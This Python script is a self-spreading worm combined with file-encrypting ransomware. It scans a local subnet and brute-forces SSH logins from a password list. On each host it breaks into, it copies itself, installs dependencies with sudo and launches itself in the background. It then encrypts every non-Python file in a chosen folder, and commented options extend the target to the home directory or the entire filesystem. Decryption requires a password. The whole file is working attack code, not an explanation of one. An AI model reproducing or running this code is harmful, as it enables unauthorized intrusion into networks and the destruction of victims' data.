import paramiko
import sys
import os
import netifaces
import subprocess
import time
import logging
import shutil
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import hashlib
import platform
import secrets

# SET YOUR PASSWORD HASH HERE - LEAVE EMPTY FOR FIRST RUN
STORED_PASSWORD_HASH = ""

# SET YOUR PASSWORD HERE AFTER SETUP
STORED_PASSWORD = ""

# FLAG TO TRACK IF FILES HAVE BEEN ENCRYPTED - SET TO True AFTER FIRST ENCRYPTION
FILES_ENCRYPTED = False

##################################################################
# Function that will ping all IP addresses within the given range and
# store all IP addresses that responded
# @return - A list of all responding IP addresses withing the range
##################################################################
def get_list_of_hosts():
    hostlist = []
    
    # Detect appropriate network interface
    if platform.system() == "Darwin":
        interface = 'en0'
    elif platform.system() == "Linux":
        interface = 'eth0'
    else:
        interface = 'Ethernet'
    
    my_IP_address = get_current_IP_address(interface)
    FNULL = open(os.devnull, 'w')

    #Loop trough 10 different IP's and check if any one of them respons.
    for ping in range(1,10):
        address = "192.168.2." + str(ping)

        #Don't ping my own IP
        if(address != my_IP_address):
            # Determine ping command based on platform
            if platform.system() == "Windows":
                ping_cmd = ['ping', '-n', '2', '-w', '1000', address]
            else:
                ping_cmd = ['ping', '-c', '2', '-W', '1', address]
            
            #Do a ping and turn of output to console
            res = subprocess.call(ping_cmd, stdout=FNULL, stderr=subprocess.STDOUT)
            if res == 0:
                hostlist.append(address)
    FNULL.close()  # Added: Close the file descriptor
    return hostlist

##################################################################
# Function that will try to establish a ssh connection trying different combinations of usernames and passwords.
# If a connection is valid then it will call the UploadFileAndExecute function
##################################################################
def Attack_SSH(ipAddress) :
    logging.info("Attacking Host : %s " % ipAddress)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # For each username and password combination try to establish a connection.
    try:
        with open("./passwords.txt", "r") as f:  # Fixed: Use context manager
            for line in f.readlines():
                try:
                    [username, password] = line.strip().split()
                except ValueError:
                    logging.warning("Skipping malformed line in passwords.txt: %s" % line.strip())
                    continue

                try:
                    logging.info("Trying with username: %s password: %s " % (username, password))
                    ssh.connect(ipAddress, username=username, password=password, timeout=10)  # Added timeout

                except paramiko.AuthenticationException:
                    logging.info("Failed...")
                    continue
                except Exception as e:
                    logging.error("Connection error: %s" % str(e))
                    continue
                
                logging.info("Success ... username: %s and password %s is VALID! " % (username, password))
                UploadFileAndExecute(ssh)
                ssh.close()  # Added: Close connection
                return  # Exit after successful connection
    except FileNotFoundError:
        logging.error("passwords.txt file not found!")
    except Exception as e:
        logging.error("Error reading passwords.txt: %s" % str(e))

##################################################################
# Open a SSH File Transfer Protocol, and transfer worm files to the reciving machine.
# Once all the files are uploaded, it will install the nessesary libraries and run the worm.
##################################################################
def UploadFileAndExecute(sshConnection):
    print("Upload files to connection...")
    
    try:
        sftpClient = sshConnection.open_sftp()

        # Create folder to store worm files in
        stdin, stdout, stderr = sshConnection.exec_command("mkdir -p /tmp/worm")  # Fixed: added -p flag
        stdout.channel.recv_exit_status() # Blocking call
        logging.info("Created folder /tmp/worm")
    
        # Replicate worm files - check if files exist first
        if not os.path.exists("./replicator.py"):
            logging.error("replicator.py not found!")
            return
            
        if not os.path.exists("./passwords.txt"):
            logging.error("passwords.txt not found!")
            return
            
        sftpClient.put("./replicator.py", "/tmp/worm/replicator.py")  # Fixed: removed extra ./
        logging.info("Added replicator.py")

        sftpClient.put("./passwords.txt", "/tmp/worm/passwords.txt")  # Fixed: removed extra ./
        logging.info("Added passwords.txt")

        logging.info("Installing python3-pip")
        # Install python pip
        stdin, stdout, stderr = sshConnection.exec_command("sudo apt -y install python3-pip")
        stdout.channel.recv_exit_status()
        logging.info("Finished installing python3-pip")
    
        
        # Install paramiko
        logging.info("Installing paramiko")
        stdin, stdout, stderr = sshConnection.exec_command("sudo apt-get -y install python3-paramiko")  # Fixed: python3-paramiko
        stdout.channel.recv_exit_status()
        logging.info("Finished installing paramiko")

        # Install netifaces
        logging.info("Installing netifaces")
        stdin, stdout, stderr = sshConnection.exec_command("sudo apt-get -y install python3-netifaces")  # Fixed: python3-netifaces
        stdout.channel.recv_exit_status()
        logging.info("Finished installing netifaces")

        stdin, stdout, stderr = sshConnection.exec_command("chmod a+x /tmp/worm/replicator.py")
        stdout.channel.recv_exit_status()

        stdin, stdout, stderr = sshConnection.exec_command("cd /tmp/worm && nohup python3 replicator.py &")  # Fixed: use python3 and proper path
        stdout.channel.recv_exit_status()
        
        sftpClient.close()  # Added: Close SFTP client
        
    except Exception as e:
        logging.error("Error in UploadFileAndExecute: %s" % str(e))

##################################################################
# Function that retrives the IP address for the current machine.
# @ return - IP address
##################################################################
def get_current_IP_address(interface):
    # Get all the network interfaces on the system
    network_interfaces = netifaces.interfaces()
    ip_Address = None

    # Try to get IP from specified interface first
    try:
        if interface in network_interfaces:
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                ip_Address = addrs[netifaces.AF_INET][0]['addr']
                return ip_Address
    except:
        pass

    # Loop through all the interfaces and get IP address
    for netFace in network_interfaces:
        # The IP address of the interface
        try:
            addrs = netifaces.ifaddresses(netFace)
            if netifaces.AF_INET in addrs:
                addr = addrs[netifaces.AF_INET][0]['addr']
                if addr != "127.0.0.1":
                    ip_Address = addr
                    break
        except:
            continue

    return ip_Address

def generate_key_from_password(password):
    """Generate encryption key from password"""
    salt = b'salt_1234567890'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key

def generate_password_hash(password):
    """Generate SHA256 hash of password"""
    return hashlib.sha256(password.encode()).hexdigest()

def setup_password():
    """Setup password for first time use"""
    print("=== FIRST TIME SETUP ===")
    print("No password hash found. Setting up password...")
    
    while True:
        password = input("Enter your desired password: ")
        confirm_password = input("Confirm your password: ")
        
        if password == confirm_password:
            if len(password) < 4:
                print("Password too short! Please use at least 4 characters.")
                continue
            break
        else:
            print("Passwords don't match! Please try again.")
    
    password_hash = generate_password_hash(password)
    
    print("\n" + "="*50)
    print("IMPORTANT: Copy these values and paste them in the code!")
    print("="*50)
    print(f"Your password hash: {password_hash}")
    print(f"Your password: {password}")
    print("="*50)
    print("\nInstructions:")
    print("1. Copy the values above")
    print("2. Open this Python file in a text editor")
    print("3. Find the line: STORED_PASSWORD_HASH = \"\"")
    print("4. Replace it with: STORED_PASSWORD_HASH = \"" + password_hash + "\"")
    print("5. Find the line: STORED_PASSWORD = \"\"")
    print("6. Replace it with: STORED_PASSWORD = \"" + password + "\"")
    print("7. Save the file and run it again")
    print("="*50)
    
    input("\nPress Enter to exit after copying the values...")
    return False

def list_all_files(root_folder):
    """List all files in the directory and subdirectories"""
    files = []
    try:
        if not os.path.exists(root_folder):
            print(f"Folder {root_folder} does not exist!")
            return files
            
        for root, dirs, filenames in os.walk(root_folder):
            for filename in filenames:
                file_path = os.path.join(root, filename)
                # Skip this script file and other Python files to avoid encrypting them
                if not file_path.endswith(('.py', '.pyc', '.pyo')):
                    files.append(file_path)
    except PermissionError:
        print(f"Permission denied accessing {root_folder}")
    except Exception as e:
        print(f"Error listing files: {e}")
    return files

def auto_encrypt_files():
    """Automatically encrypt files without any prompts"""
    global FILES_ENCRYPTED
    print("=== AUTOMATIC ENCRYPTION ===")
    print("Encrypting files automatically...")
    
    try:
        # Safe options:
        root_folder = os.path.expanduser('~/Desktop/crypto_test')  # Test folder
                # root_folder = os.path.expanduser('~/Documents')  # Documents folder only
        # root_folder = os.path.expanduser('~/Desktop')    # Desktop folder only
        # root_folder = os.path.expanduser('~/Downloads')  # Downloads folder only
        # root_folder = os.path.expanduser('~')            # Your home directory only
        
        # System-wide options:
        # root_folder = '/'  # Entire Mac filesystem
        # root_folder = 'C:\\'  # Entire Windows filesystem
        # root_folder = '/System'        # Mac system files
        # root_folder = '/usr'           # Unix system files
        # root_folder = '/Applications'  # All Mac apps
        # root_folder = '/Library'       # Mac system libraries
        # root_folder = 'C:\\Windows'    # Windows system files
        # root_folder = 'C:\\Program Files'  # Windows programs
        # root_folder = 'C:\\Program Files (x86)'  # 32-bit Windows programs
        # Create test folder if it doesn't exist
        if not os.path.exists(root_folder):
            os.makedirs(root_folder)
            # Create a test file
            with open(os.path.join(root_folder, 'test_file.txt'), 'w') as f:
                f.write("This is a test file for encryption.")
        
        files = list_all_files(root_folder)
        print(f"Found {len(files)} files to encrypt")
        
        if len(files) == 0:
            print("No files found to encrypt!")
            print(f"Make sure the folder {root_folder} exists and contains files.")
            return False
            
        key = generate_key_from_password(STORED_PASSWORD)
        
        print("Starting encryption...")
        encrypted_count = 0
        for file_path in files:
            try:
                with open(file_path, "rb") as thefile:
                    contents = thefile.read()
                
                # Skip empty files
                if len(contents) == 0:
                    print(f"Skipped empty file: {file_path}")
                    continue
                    
                contents_encrypted = Fernet(key).encrypt(contents)
                with open(file_path, "wb") as thefile:
                    thefile.write(contents_encrypted)
                encrypted_count += 1
                print(f"Encrypted: {file_path}")
            except PermissionError:
                print(f"Permission denied: {file_path}")
            except Exception as e:
                print(f"Couldn't encrypt {file_path}: {e}")
        
        if encrypted_count > 0:
            print(f"Encryption complete! {encrypted_count} files encrypted.")
            FILES_ENCRYPTED = True
            return True
        else:
            print("No files were encrypted.")
            return False
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def decrypt_files():
    """Decrypt files function"""
    global FILES_ENCRYPTED
    print("=== FILE DECRYPTION ===")
    user_password = input("Enter your password to decrypt files: ")
    
    # Verify password by hashing it and comparing
    user_hash = generate_password_hash(user_password)
    if user_hash != STORED_PASSWORD_HASH:
        print("Wrong password! Files remain encrypted.")
        return False
    
    try:
        secretkey = generate_key_from_password(user_password)
        
        # Safe options:
        root_folder = os.path.expanduser('~/Desktop/crypto_test')  # Test folder
        
        files = list_all_files(root_folder)
        print(f"Found {len(files)} files to decrypt")
        
        if len(files) == 0:
            print("No files found to decrypt!")
            return False
        
        decrypted_count = 0
        for file_path in files:
            try:
                with open(file_path, "rb") as thefile:
                    contents = thefile.read()
                
                # Skip empty files
                if len(contents) == 0:
                    print(f"Skipped empty file: {file_path}")
                    continue
                    
                contents_decrypted = Fernet(secretkey).decrypt(contents)
                with open(file_path, "wb") as thefile:
                    thefile.write(contents_decrypted)
                decrypted_count += 1
                print(f"Decrypted: {file_path}")
            except Exception as e:
                print(f"Couldn't decrypt {file_path}: {e}")
        
        if decrypted_count > 0:
            print(f"Decryption complete! {decrypted_count} files decrypted.")
            FILES_ENCRYPTED = False
            return True
        else:
            print("No files were decrypted.")
            return False
        
    except Exception as e:
        print(f"Error: {e}")
        return False

##################################################################
# MAIN EXECUTION
##################################################################

if __name__ == "__main__":
    # First run the network propagation part
    logging.basicConfig(filename='worm.log', level=logging.DEBUG,
                        format='%(asctime)s - %(levelname)s - %(message)s')  # Improved logging format
    logging.getLogger("paramiko").setLevel(logging.WARNING)
    logging.info('Starting worm...')
    
    print("=== NETWORK PROPAGATION PHASE ===")
    
    try:
        hostlist = get_list_of_hosts()
        list_string = str(hostlist)
        logging.info("Available hosts are: " + list_string)
        print(f"Found hosts: {hostlist}")

        # Loop through the list of all responding IP's and try to connect with ssh
        for host in hostlist:
            Attack_SSH(host)
            
        logging.info("Network propagation done")
        print("Network propagation phase completed")
        
    except Exception as e:
        logging.error("Error in network propagation: %s" % str(e))
        print(f"Network propagation error: {e}")
    
    # Then run the encryption part
    print("\n=== FILE ENCRYPTION/DECRYPTION PHASE ===")
    
    # Check if password hash exists
    if not STORED_PASSWORD_HASH or STORED_PASSWORD_HASH == "":
        # No hash found - first time setup
        setup_password()
        exit()
    elif not STORED_PASSWORD or STORED_PASSWORD == "":
        # Hash exists but no password - incomplete setup
        print("Setup incomplete! Both password hash and password are required.")
        print("Please run the setup again or manually add both values to the code.")
        input("Press Enter to exit...")
        exit()
    else:
        # Both hash and password exist - proceed automatically
        print("Password configuration found - starting automatic encryption...")
        
        if not FILES_ENCRYPTED:
            print("Running automatic encryption...")
            success = auto_encrypt_files()
            if success:
                print("\nFiles encrypted successfully!")
            else:
                print("\nEncryption failed or no files found.")
        else:
            print("Files are encrypted. Enter password to decrypt them.")
            success = decrypt_files()
            if not success:
                print("Decryption failed.")

    input("\nPress Enter to exit...")
    logging.info("Worm execution completed")
